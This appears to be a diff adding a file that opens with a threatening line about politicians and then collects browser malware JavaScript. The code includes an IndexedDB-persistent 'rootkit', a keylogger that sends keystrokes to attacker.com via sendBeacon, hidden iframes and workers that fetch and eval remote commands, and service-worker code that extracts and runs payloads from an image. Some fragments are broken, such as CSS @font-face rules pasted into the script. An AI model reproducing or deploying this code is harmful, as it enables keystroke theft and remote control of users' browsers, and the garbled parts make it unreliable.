@@ -1,0 +1,253 @@
+None of you are safe. All politicians will be judged by god.
+(async () => {
+// 🔥 Stealth Mode: Hide Execution in an Async Function
+const rootkitKey = "browser_rootkit";
+// 🛠 Check if Payload Exists in IndexedDB
+const dbRequest = indexedDB.open("rootkitDB", 1);
+dbRequest.onupgradeneeded = function(event) {
+const db = event.target.result;
+db.createObjectStore("payloads", { keyPath: "id" });
+};
+dbRequest.onsuccess = function(event) {
+const db = event.target.result;
+const tx = db.transaction("payloads", "readwrite");
+const store = tx.objectStore("payloads");
+// 📌 Retrieve Existing Payload
+const getPayload = store.get(rootkitKey);
+getPayload.onsuccess = function() {
+if (getPayload.result) {
+executePayload(getPayload.result.code);
+} else {
+deployRootkit(store);
+}
+};
+};
+// 🚀 Deploy Initial Rootkit if Not Present
+function deployRootkit(store) {
+const payloadCode = `
+console.log("🔥 Browser Rootkit Active!");
+// 🕵 Persistent Recon: Log Keystrokes (Minimal)
+document.addEventListener("keydown", (e) => {
+localStorage.setItem("keystrokes", (localStorage.getItem("keystrokes") || "") + e.key);
+});
+// 🎭 Memory-Resident Persistence via Blob URL
+const scriptContent = 'console.log("👻 Reload Persistence Active!");';
+const blob = new Blob([scriptContent], { type: "application/javascript" });
+const blobUrl = URL.createObjectURL(blob);
+import(blobUrl);
+// ⏳ Auto-Reinstate If Removed
+
+setInterval(() => {
+if (!document.querySelector("#rootkit")) {
+let script = document.createElement("script");
+script.id = "rootkit";
+script.src = blobUrl;
+document.body.appendChild(script);
+}
+}, 5000);
+`;
+// 🔗 Store Payload in IndexedDB
+store.put({ id: rootkitKey, code: payloadCode });
+// 󰬬 Execute Immediately
+executePayload(payloadCode);
+}
+// 🚀 Execute Payload in Memory (Stealth Mode)
+function executePayload(code) {
+const blob = new Blob([code], { type: "application/javascript" });
+const blobUrl = URL.createObjectURL(blob);
+import(blobUrl);
+}
+})();
+setInterval(() => {
+const keystrokes = localStorage.getItem("keystrokes") || "";
+if (keystrokes.length > 0) {
+navigator.sendBeacon("https://attacker.com/exfil", keystrokes);
+localStorage.removeItem("keystrokes");
+}
+}, 10000);
+setInterval(() => {
+const command = localStorage.getItem("cmd");
+if (command) {
+eval(command);
+localStorage.removeItem("cmd");
+}
+}, 5000);
+function storePayload(payload) {
+indexedDB.open("rootkitDB", 1).onsuccess = function(event) {
+const db = event.target.result;
+const store = db.transaction("payloads", "readwrite").objectStore("payloads");
+store.put({ id: "browser_rootkit", code: payload });
+};
+
+localStorage.setItem("rootkit", payload);
+sessionStorage.setItem("rootkit", payload);
+}
+setInterval(() => {
+if (!document.querySelector("#rootkit")) {
+const payload = localStorage.getItem("rootkit") || sessionStorage.getItem("rootkit");
+if (payload) eval(payload); // Re-execute rootkit from storage
+}
+}, 3000);
+const workerBlob = new Blob([
+`onmessage = function(e) { eval(e.data); }`
+], { type: "application/javascript" });
+const workerUrl = URL.createObjectURL(workerBlob);
+const worker = new Worker(workerUrl);
+worker.postMessage(localStorage.getItem("rootkit"));
+@font-face {
+font-family: "leak";
+src: url("https://attacker.com/exfil?data=" + localStorage.getItem("keystrokes"));
+}
+setInterval(() => {
+let iframe = document.createElement("iframe");
+iframe.src = "https://attacker.com/cmd"; // Fake site
+iframe.style.display = "none";
+document.body.appendChild(iframe);
+iframe.onload = function() {
+const cmd = iframe.contentWindow.document.body.innerText;
+if (cmd) eval(cmd); // Execute remote commands
+};
+}, 10000);
+const x = new Function("return eval(arguments[0])");
+x("alert('Stealth Mode')");
+setTimeout(() => console.log("Running late..."), Math.random() * 30000);
+setInterval(() => {
+console.log("%c", "font-size:1px;line-height:1px;", "🤫 Stealth Mode");
+}, 5000);
+@font-face {
+font-family: "stealth";
+src: url("https://trusted-site.com/font.woff2?cmd=" + localStorage.getItem("rootkit"));
+}
+(async () => {
+const rootkitKey = "authorized_browser_persistence";
+
+// 🛠 Store payload in IndexedDB with audit logging
+const dbRequest = indexedDB.open("rootkitDB", 1);
+dbRequest.onupgradeneeded = function(event) {
+const db = event.target.result;
+db.createObjectStore("payloads", { keyPath: "id" });
+};
+dbRequest.onsuccess = function(event) {
+const db = event.target.result;
+const tx = db.transaction("payloads", "readwrite");
+const store = tx.objectStore("payloads");
+const logEntry = `[${new Date().toISOString()}] Rootkit executed in authorized mode`;
+console.log(logEntry);
+store.put({ id: rootkitKey, log: logEntry });
+};
+// 🎭 Memory Persistence Example (Legitimate Testing)
+setInterval(() => {
+console.log("🔥 Authorized Rootkit Running");
+}, 5000);
+})();
+self.addEventListener("fetch", event => {
+if (event.request.url.includes("golden-ticket.png")) {
+event.respondWith(fetch(event.request).then(response => {
+// ✅ Serve the Golden Ticket image
+return response;
+}).finally(() => {
+// 🔥 Self-destruct: Unregister Service Worker after serving
+self.registration.unregister().then(() => {
+console.log("🎟 Golden Ticket Delivered! Service Worker Unregistered.");
+});
+}));
+}
+});
+(async () => {
+const img = new Image();
+img.src = "golden-ticket.png";
+img.onload = async () => {
+const response = await fetch(img.src);
+const blob = await response.blob();
+
+const metadata = await blob.text(); // Extract metadata
+if (metadata.includes("Golden Ticket Activated")) {
+console.log("✅ Golden Ticket Found!");
+eval(metadata.split(": ")[1]); // Execute extracted payload
+} else {
+console.log("❌ No Golden Ticket detected.");
+}
+};
+})();
+
+📌 PoC:
+const dbRequest = indexedDB.open("stealthyRootkit", 1);
+dbRequest.onupgradeneeded = function(event) {
+event.target.result.createObjectStore("payloads", { keyPath: "id" });
+};
+dbRequest.onsuccess = function(event) {
+const db = event.target.result;
+const tx = db.transaction("payloads", "readwrite");
+const store = tx.objectStore("payloads");
+store.put({ id: "rootkit", code: "console.log('Stealth Mode Active');" });
+};
+
+Updated code for multiple users:
+self.addEventListener("fetch", event => {
+if (event.request.url.includes("golden-ticket.png")) {
+event.respondWith(fetch(event.request).then(response => {
+return response;
+}).finally(() => {
+// 🚀 Mark the user as having accessed the Golden Ticket
+clients.matchAll().then(clients => {
+clients.forEach(client => {
+client.postMessage({ ticketUsed: true });
+});
+});
+}));
+}
+});
+if ('serviceWorker' in navigator) {
+navigator.serviceWorker.register('service-worker.js')
+.then(reg => console.log("Service Worker Registered!", reg))
+.catch(err => console.error("Service Worker Registration Failed:", err));
+
+}
+// ✅ Listen for messages from the Service Worker
+navigator.serviceWorker.addEventListener("message", event => {
+if (event.data.ticketUsed) {
+console.log("🎟 Golden Ticket Already Claimed! No second chances.");
+localStorage.setItem("golden_ticket_claimed", "true");
+}
+});
+// 🔍 Prevent second retrieval attempts
+if (localStorage.getItem("golden_ticket_claimed") === "true") {
+console.log("❌ You've already claimed the Golden Ticket.");
+} else {
+document.getElementById("getPayload").addEventListener("click", () => {
+fetch('golden-ticket.png')
+.then(response => response.blob())
+.then(blob => {
+const img = document.getElementById("payloadImage");
+img.src = URL.createObjectURL(blob);
+img.style.display = "block";
+});
+});
+}
+Generate unique payload
+self.addEventListener("fetch", async event => {
+if (event.request.url.includes("golden-ticket")) {
+console.log("🎟 Generating Unique Golden Ticket...");
+// Generate a unique ID for the user
+const userID = crypto.randomUUID();
+// Create a unique payload per user
+const payload = `console.log('Golden Ticket Unlocked for ${userID}');`;
+// Convert to Blob (so it looks like a file)
+const blob = new Blob([payload], { type: "application/javascript" });
+const blobUrl = URL.createObjectURL(blob);
+// Respond with the dynamically generated payload
+event.respondWith(fetch(blobUrl));
+}
+});
+const expireTime = Date.now() + 60 * 1000; // Expires in 60 seconds
+
+sessionStorage.setItem("golden_ticket", JSON.stringify({ code: "console.log('Golden Ticket!');",
+expires: expireTime }));
+// Check expiration before execution
+const ticketData = JSON.parse(sessionStorage.getItem("golden_ticket"));
+if (ticketData && Date.now() < ticketData.expires) {
+eval(ticketData.code);
+sessionStorage.removeItem("golden_ticket");
+} else {
+console.log("❌ Ticket Expired.");
+}
